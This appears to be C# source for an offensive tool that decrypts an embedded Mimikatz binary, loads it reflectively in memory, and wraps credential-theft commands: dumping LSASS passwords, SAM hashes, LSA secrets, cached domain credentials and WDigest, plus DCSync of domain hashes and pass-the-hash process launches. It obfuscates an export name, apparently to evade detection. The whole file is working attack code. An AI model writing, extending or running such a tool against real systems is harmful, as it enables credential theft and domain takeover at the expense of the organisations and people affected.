﻿using System;
using System.Text;
using System.Threading;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

using SSploit.Misc;
using SSploit.Execution;
using PInvoke = SSploit.Execution.PlatformInvoke;
using System.IO;
using System.IO.Compression;

namespace NonInteractiveKatz
{
    public class NonInteractiveKatz
    {
        private static byte[] PEBytes32 { get; set; }
        private static byte[] PEBytes64 { get; set; }

        private static PE MimikatzPE { get; set; } = null;
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr MimikatzType(IntPtr command);

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes a chosen Mimikatz command.
        /// </summary>
        /// <param name="Command">Mimikatz command to be executed.</param>
        /// <returns>Mimikatz output.</returns>
        public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords")
        {
            // Console.WriteLine(String.Join(",", System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames()));
            if (MimikatzPE == null)
            {
                if (IntPtr.Size == 8 ) //x64 Unpack And Execute
                {
                    //x64 Unpack And Execute
                    Console.WriteLine("x64 !! Gocha");
                    PEBytes64 = Utilities.Decrypt(NonInteractiveMimikatz.Properties.Resources.x64powerkatz);
                    MimikatzPE = PE.Load(PEBytes64);
                }
                else if (IntPtr.Size == 4)
                {
                    //x86 Unpack And Execute
                    Console.WriteLine("x86 !! Gocha");
                    PEBytes32 = Utilities.Decrypt(NonInteractiveMimikatz.Properties.Resources.Win32powerkatz);
                    MimikatzPE = PE.Load(PEBytes32);
                }
                
            }
            if (MimikatzPE == null) { return ""; }
            IntPtr functionPointer = MimikatzPE.GetFunctionExport("pAAAowershell_".Replace("AAA","") + " reflective_".TrimStart() +" mimikatz".Trim());
            if (functionPointer == IntPtr.Zero) { return ""; }
            MimikatzType mimikatz = (MimikatzType)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(MimikatzType));
            IntPtr input = Marshal.StringToHGlobalUni(Command);
            try
            {
                IntPtr output = IntPtr.Zero;
                Thread t = new Thread(() =>
                {
                    try
                    {
                        output = mimikatz(input);
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("MimikatzException: " + e.Message + e.StackTrace);
                    }
                });
                t.Start();
                t.Join();
                Marshal.FreeHGlobal(input);
                if (output == IntPtr.Zero)
                {
                    return "";
                }
                string stroutput = Marshal.PtrToStringUni(output);
                PInvoke.Win32.Kernel32.LocalFree(output);
                return stroutput;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("MimikatzException: " + e.Message + e.StackTrace);
                return "";
            }
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatzcommand to retrieve plaintext
        /// passwords from LSASS. Equates to `Command("privilege::debug sekurlsa::logonPasswords")`. (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
        public static string LogonPasswords()
        {
            return Command("privilege::debug sekurlsa::logonPasswords");
        }

        public static string Coffee()
        {
            string s = Command("privilege::debug coffee");
            return s;
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve password hashes
        /// from the SAM database. Equates to `Command("privilege::debug lsadump::sam")`. (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string SamDump()
        {
            return Command("token::elevate lsadump::sam");
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve LSA secrets
        /// stored in registry. Equates to `Command("privilege::debug lsadump::secrets")`. (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string LsaSecrets()
        {
            return Command("token::elevate lsadump::secrets");
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve Domain
        /// Cached Credentials hashes from registry. Equates to `Command("privilege::debug lsadump::cache")`.
        /// (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string LsaCache()
        {
            return Command("token::elevate lsadump::cache");
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve Wdigest
        /// credentials from registry. Equates to `Command("sekurlsa::wdigest")`.
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string Wdigest()
        {
            return Command("sekurlsa::wdigest");
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes each of the builtin local commands (not DCSync). (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string All()
        {
            StringBuilder builder = new StringBuilder();
            builder.AppendLine(LogonPasswords());
            builder.AppendLine(SamDump());
            builder.AppendLine(LsaSecrets());
            builder.AppendLine(LsaCache());
            builder.AppendLine(Wdigest());
            return builder.ToString();
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes the "dcsync" module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)
        /// </summary>
        /// <param name="user">Username to retrieve NTLM hash for. "All" for all domain users.</param>
        /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
        /// <param name="DC">Optionally specify a specific Domain Controller to target for the dcsync.</param>
        /// <returns>The NTLM hash of the target user(s).</returns>
        public static string DCSync(string user, string FQDN = null, string DC = null)
        {
            string command = "\"";
            command += "lsadump::dcsync";
            if (user.ToLower() == "all")
            {
                command += " /all";
            }
            else
            {
                command += " /user:" + user;
            }
            if (FQDN != null && FQDN != "")
            {
                command += " /domain:" + FQDN;
            }
            else
            {
                command += " /domain:" + IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            if (DC != null && DC != "")
            {
                command += " /dc:" + DC;
            }
            command += "\"";

            return Command(command);
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes the "pth" module to start a new process
        /// as a user using an NTLM password hash for authentication.
        /// </summary>
        /// <param name="user">Username to authenticate as.</param>
        /// <param name="NTLM">NTLM hash to authenticate the user.</param>
        /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
        /// <param name="run">The command to execute as the specified user.</param>
        /// <returns></returns>
        public static string PassTheHash(string user, string NTLM, string FQDN = null, string run = "cmd.exe")
        {
            string command = "\"";
            command += "sekurlsa::pth";
            command += " /user:" + user;
            if (FQDN != null && FQDN != "")
            {
                command += " /domain:" + FQDN;
            }
            else
            {
                command += " /domain:" + IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            command += " /ntlm:" + NTLM;
            command += " /run:" + run;
            command += "\"";
            return Command(command);
        }
    }
}
